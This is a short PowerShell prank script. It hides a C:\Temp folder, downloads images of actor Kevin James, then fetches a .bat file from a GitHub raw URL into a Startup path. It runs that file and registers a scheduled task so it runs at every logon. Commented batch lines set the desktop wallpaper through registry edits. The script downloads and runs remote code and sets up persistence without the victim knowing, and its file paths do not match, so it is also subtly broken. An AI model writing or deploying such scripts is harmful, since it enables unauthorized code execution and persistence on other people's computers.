mkdir C:\Temp\
attrib +h C:\Temp\
(new-object System.Net.WebClient).Downloadfile("https://images.gawker.com/18k53ek1l65vljpg/c_scale,fl_progressive,q_80,w_800.jpg","C:\Temp\1.jpg")
(new-object System.Net.WebClient).Downloadfile("https://i.ytimg.com/vi/I94_uI6eF64/hqdefault.jpg","C:\Temp\2.jpg")
(new-object System.Net.WebClient).Downloadfile("https://www.gannett-cdn.com/-mm-/3e6ab73b92f0b5ac7942e4463e96323cbd8b9f14/c=0-505-2133-1708/local/-/media/Brevard/2014/09/02/kevinjames2011.jpg?width=3200&height=1680&fit=crop","C:\Temp\3.jpg")
(new-object System.Net.WebClient).Downloadfile("https://www.famousbirthdays.com/faces/james-kevin-image.jpg","C:\Temp\4.jpg")
(new-object System.Net.WebClient).Downloadfile("https://pmcdeadline2.files.wordpress.com/2016/05/kevin-james.jpg","C:\Temp\5.jpg")
(new-object System.Net.WebClient).Downloadfile("https://media.brstatic.com/2017/05/04120310/kevin-james-net-worth.jpg","C:\Temp\6.jpg")
(new-object System.Net.WebClient).Downloadfile("https://i.pinimg.com/originals/3f/a8/ea/3fa8ea55ea6802c8ce13d449fdaa25a9.jpg","C:\Temp\7.jpg")
(new-object System.Net.WebClient).Downloadfile("https://raw.githubusercontent.com/calebpmiller/Files/master/Kevin_James.bat","C:\Temp\Microsoft\Windows\Start Menu\Programs\Startup\Kevin_James.bat")
Start-Process -FilePath C:\Temp\Kevin_James.bat
schtasks /create /tn Kevin_James /tr C:\Temp\Kevin_James.bat /sc onlogon


#@echo off
#reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "" /f 
#reg add "HKCU\control panel\desktop" /v wallpaper /t REG_SZ /d "C:\[LOCATION OF WALLPAPER HERE]" /f 
#reg delete "HKCU\Software\Microsoft\Internet Explorer\Desktop\General" /v WallpaperStyle /f
#reg add "HKCU\control panel\desktop" /v WallpaperStyle /t REG_SZ /d 2 /f
#RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True
#exit
